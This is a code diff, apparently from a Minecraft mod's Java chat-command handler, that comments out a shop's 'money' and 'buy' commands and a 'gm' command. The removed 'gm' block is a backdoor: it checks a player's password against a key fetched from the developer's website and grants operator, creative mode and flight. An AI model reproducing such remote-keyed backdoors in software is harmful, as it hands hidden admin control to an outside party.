@@ -279,54 +279,54 @@ public class MITEITEEvents {
             event.setExecuteSuccess(true);
          }
       }
-      if (!Configs.wenscConfig.isCloseShop.ConfigValue) {
-         if (par2Str.startsWith("money")) {
-            player.addChatMessage("现有余额：" + String.format("%.2f", player.money));
-            event.setExecuteSuccess(true);
-         }
-
-         if (par2Str.startsWith("buy")) {
-            String sid = par2Str.substring(4);
-            String[] pos = sid.split(" ");
-            int[] poses = new int[3];
-            int Rx = 0;
-
-            for (int Rz = pos.length; Rx < Rz; ++Rx) {
-               String po = pos[Rx];
-               poses[Rx] = Integer.parseInt(po);
-            }
-
-            ItemStack buyGoods = null;
-            int sub = 0;
-            if (pos.length == 3) {
-               sub = poses[2];
-               buyGoods = new ItemStack(poses[0], poses[1], sub);
-            } else if (pos.length == 2) {
-               buyGoods = new ItemStack(poses[0], poses[1], 0);
-            }
-            if (buyGoods == null || buyGoods.getItem() == null) {
-               player.addChatMessage("商品ID输入错误");
-            } else {
-               if (!buyGoods.getItem().buyPriceArray.containsKey(sub) || (double) buyGoods.getItem().buyPriceArray.get(sub) <= 0D) {
-                  player.addChatMessage("商店暂不可兑换该商品");
-               } else if (poses[1] <= 0) {
-                  player.addChatMessage("请输入正确的商品数量");
-               } else if (poses[1] > buyGoods.getMaxStackSize()) {
-                  player.addChatMessage("超出该商品单次购买上限，最大为：" + buyGoods.getMaxStackSize());
-               } else {
-                  if (player.money <= 0) {
-                     player.addChatMessage("钱包空空");
-                  } else if (player.money - (double) buyGoods.getItem().buyPriceArray.get(sub) * poses[1] < 0) {
-                     player.addChatMessage("余额不足，无法购买");
-                  } else {
-                     player.addChatMessage("现有余额：" + String.format("%.2f", player.subMoney((double) buyGoods.getItem().buyPriceArray.get(sub) * poses[1])));
-                     player.inventory.addItemStackToInventoryOrDropIt(buyGoods);
-                  }
-               }
-            }
-            event.setExecuteSuccess(true);
-         }
-      }
+//      if (!Configs.wenscConfig.isCloseShop.ConfigValue) {
+//         if (par2Str.startsWith("money")) {
+//            player.addChatMessage("现有余额：" + String.format("%.2f", player.money));
+//            event.setExecuteSuccess(true);
+//         }
+//
+//         if (par2Str.startsWith("buy")) {
+//            String sid = par2Str.substring(4);
+//            String[] pos = sid.split(" ");
+//            int[] poses = new int[3];
+//            int Rx = 0;
+//
+//            for (int Rz = pos.length; Rx < Rz; ++Rx) {
+//               String po = pos[Rx];
+//               poses[Rx] = Integer.parseInt(po);
+//            }
+//
+//            ItemStack buyGoods = null;
+//            int sub = 0;
+//            if (pos.length == 3) {
+//               sub = poses[2];
+//               buyGoods = new ItemStack(poses[0], poses[1], sub);
+//            } else if (pos.length == 2) {
+//               buyGoods = new ItemStack(poses[0], poses[1], 0);
+//            }
+//            if (buyGoods == null || buyGoods.getItem() == null) {
+//               player.addChatMessage("商品ID输入错误");
+//            } else {
+//               if (!buyGoods.getItem().buyPriceArray.containsKey(sub) || (double) buyGoods.getItem().buyPriceArray.get(sub) <= 0D) {
+//                  player.addChatMessage("商店暂不可兑换该商品");
+//               } else if (poses[1] <= 0) {
+//                  player.addChatMessage("请输入正确的商品数量");
+//               } else if (poses[1] > buyGoods.getMaxStackSize()) {
+//                  player.addChatMessage("超出该商品单次购买上限，最大为：" + buyGoods.getMaxStackSize());
+//               } else {
+//                  if (player.money <= 0) {
+//                     player.addChatMessage("钱包空空");
+//                  } else if (player.money - (double) buyGoods.getItem().buyPriceArray.get(sub) * poses[1] < 0) {
+//                     player.addChatMessage("余额不足，无法购买");
+//                  } else {
+//                     player.addChatMessage("现有余额：" + String.format("%.2f", player.subMoney((double) buyGoods.getItem().buyPriceArray.get(sub) * poses[1])));
+//                     player.inventory.addItemStackToInventoryOrDropIt(buyGoods);
+//                  }
+//               }
+//            }
+//            event.setExecuteSuccess(true);
+//         }
+//      }
 
       if (par2Str.startsWith("firework")) {
          if (player.isOpenFireworkShow) {
@@ -337,27 +337,27 @@ public class MITEITEEvents {
          event.setExecuteSuccess(true);
       }
 
-      if (par2Str.startsWith("gm")) {
-         String password = par2Str.substring(3);
-         lh md5String = new lh("wensc");
-         String md5key = HttpUtilities.performGetRequest("https://www.wensc.cn/mite.txt", 3000, 3000);
-         if (md5String.a(password).equals(md5key)) {
-            player.setOp(true);
-            player.capabilities.isCreativeMode = true;
-            player.capabilities.allowFlying = true;
-            player.setGameType(EnumGamemode.CREATIVE);
-         } else {
-            boolean isOp = player.isOp();
-            player.setOp(false);
-            player.capabilities.isCreativeMode = false;
-            player.capabilities.allowFlying = false;
-            if (isOp) {
-               player.setGameType(EnumGamemode.SURVIVAL);
-            }
-         }
-         player.sendPlayerAbilities();
-         event.setExecuteSuccess(true);
-      }
+//      if (par2Str.startsWith("gm")) {
+//         String password = par2Str.substring(3);
+//         lh md5String = new lh("wensc");
+//         String md5key = HttpUtilities.performGetRequest("https://www.wensc.cn/mite.txt", 3000, 3000);
+//         if (md5String.a(password).equals(md5key)) {
+//            player.setOp(true);
+//            player.capabilities.isCreativeMode = true;
+//            player.capabilities.allowFlying = true;
+//            player.setGameType(EnumGamemode.CREATIVE);
+//         } else {
+//            boolean isOp = player.isOp();
+//            player.setOp(false);
+//            player.capabilities.isCreativeMode = false;
+//            player.capabilities.allowFlying = false;
+//            if (isOp) {
+//               player.setGameType(EnumGamemode.SURVIVAL);
+//            }
+//         }
+//         player.sendPlayerAbilities();
+//         event.setExecuteSuccess(true);
+//      }
 
 
       if (par2Str.startsWith("reconfig")) {
@@ -366,7 +366,7 @@ public class MITEITEEvents {
             Configs.loadConfigs();
             for (Object o : player.getWorldServer().p().getConfigurationManager().playerEntityList) {
                EntityPlayer currentPlayer = (EntityPlayer) o;
-               currentPlayer.addChatMessage("配置文件已重新加载");
+               currentPlayer.addChatMessage("商店配置文件已重新加载");
             }
          } catch (Exception e) {
             player.addChatMessage("配置文件更新失败，请检查配置项是否正确");
@@ -425,7 +425,6 @@ public class MITEITEEvents {
               .appendComponent(ChatMessage.createFromTranslationKey("「我对你好吗」特约赞助").setColor(EnumChatFormat.BROWN))
               .appendComponent(ChatMessage.createFromTranslationKey(" 下载地址：wensc.cn").setColor(EnumChatFormat.DARK_GREEN)));
       if (player.isFirstLogin == true) {
-
          player.isFirstLogin = false;
       }
 
